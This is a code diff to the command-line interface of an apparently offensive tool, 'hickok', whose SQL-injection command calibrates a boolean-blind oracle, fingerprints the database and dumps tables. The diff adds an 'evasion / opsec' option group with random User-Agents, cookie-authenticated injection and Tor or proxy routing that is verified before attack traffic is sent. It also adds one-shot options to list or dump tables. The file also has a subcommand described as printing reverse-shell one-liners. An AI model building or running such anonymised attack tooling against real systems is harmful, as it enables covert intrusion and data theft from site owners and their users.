@@ -8,7 +8,7 @@ import re
 import sys
 from urllib.parse import parse_qs, urlsplit
 
-from hickok import __version__, findings, payloads, sqli
+from hickok import __version__, findings, http, payloads, sqli
 from hickok.console import DIM, THEMES, Console
 from hickok.handler import ShellServer
 
@@ -53,6 +53,7 @@ def _console(args) -> Console:
         theme=getattr(args, "theme", None),
         color=False if getattr(args, "no_color", False) else None,
         banner=not getattr(args, "no_banner", False),
+        verbose=getattr(args, "verbose", 0),
     )
 
 
@@ -160,10 +161,33 @@ def cmd_sql(args) -> None:
     if param in q and args.value == "1":         # take the URL's own value unless overridden
         value = q[param][0]
 
+    # Build the HTTP sender with the operational options (UA, proxy/Tor, …).
+    headers = {}
+    for h in (args.header or []):
+        name, _, val = h.partition(":")
+        if val:
+            headers[name.strip()] = val.strip()
+    ua = args.user_agent or (http.random_agent() if args.random_agent else None)
+    try:
+        net = http.Http(ua=ua, headers=headers, cookie=args.cookie, proxy=args.proxy,
+                        tor=args.tor, delay=args.delay, timeout=args.timeout)
+    except http.TorError as exc:
+        c.bad(str(exc))
+        raise SystemExit(2)
+
+    if args.tor or args.proxy:
+        c.info(f"routing through {'Tor' if args.tor else args.proxy}")
+    if args.tor:                               # fail closed: never attack if Tor isn't confirmed
+        c.info("verifying Tor exit…")
+        if not net.check_tor():
+            c.bad("Tor not confirmed — aborting before sending attack traffic")
+            raise SystemExit(2)
+        c.good("Tor confirmed — anonymised")
+
     p = urlsplit(url)
     c.info(f"injecting '{param}' at {p.scheme}://{p.netloc}{p.path}")
     c.info("calibrating boolean-blind oracle…")
-    oracle = sqli.calibrate(url, param, value)
+    oracle = sqli.calibrate(net, url, param, value, console=c)
     if oracle is None:
         c.bad("no boolean-blind injection here — try another parameter or value")
         raise SystemExit(1)
@@ -171,7 +195,18 @@ def cmd_sql(args) -> None:
     dbms = sqli.fingerprint(oracle)
     prof = sqli._PROFILES.get(dbms, sqli._PROFILES["sqlite"])
     c.good(f"DBMS: {dbms}")
-    _sql_repl(c, oracle, prof)
+
+    # Non-interactive (batch) one-shots, else the interactive console.
+    if args.banner:
+        c.good(sqli.extract_str(oracle, prof, prof["version"]))
+    elif args.tables:
+        for t in sqli.tables(oracle, prof):
+            c.plain(f"  {t}")
+    elif args.dump:
+        cols = sqli.columns(oracle, prof, args.dump)
+        _print_table(c, cols, sqli.dump(oracle, prof, args.dump, cols))
+    else:
+        _sql_repl(c, oracle, prof)
 
 
 def _print_table(c, cols, rows) -> None:
@@ -281,6 +316,22 @@ def build_parser() -> argparse.ArgumentParser:
     sq.add_argument("-u", "--url", help="target URL (default: wraith's latest SQLi finding)")
     sq.add_argument("-p", "--param", help="injectable parameter (inferred if the URL has just one)")
     sq.add_argument("--value", metavar="V", default="1", help="a normal value for the parameter (default: 1)")
+    sq.add_argument("-v", "--verbose", nargs="?", const=1, type=int, default=0, metavar="LEVEL",
+                    help="-v 2 prints every injected payload")
+    ev = sq.add_argument_group("evasion / opsec")
+    ev.add_argument("--random-agent", action="store_true", help="use a random real browser User-Agent")
+    ev.add_argument("-A", "--user-agent", metavar="UA", help="explicit User-Agent")
+    ev.add_argument("-H", "--header", action="append", metavar="'K: V'", help="extra header (repeatable)")
+    ev.add_argument("--cookie", metavar="STR", help="Cookie header (for authenticated injection)")
+    ev.add_argument("--proxy", metavar="URL", help="http://host:port or socks5h://host:port")
+    ev.add_argument("--tor", action="store_true",
+                    help="route via Tor (socks5h://127.0.0.1:9050), verified — fails closed")
+    ev.add_argument("--delay", metavar="SEC", type=float, default=0.0, help="seconds between requests")
+    ev.add_argument("--timeout", metavar="SEC", type=float, default=15.0, help="per-request timeout")
+    bt = sq.add_argument_group("non-interactive (run one action and exit)")
+    bt.add_argument("--banner", action="store_true", help="print the DBMS version")
+    bt.add_argument("--tables", action="store_true", help="list tables")
+    bt.add_argument("--dump", metavar="TABLE", help="dump a table")
     sq.set_defaults(func=cmd_sql)
 
     pl = sub.add_parser("payloads", help="print reverse-shell one-liners",
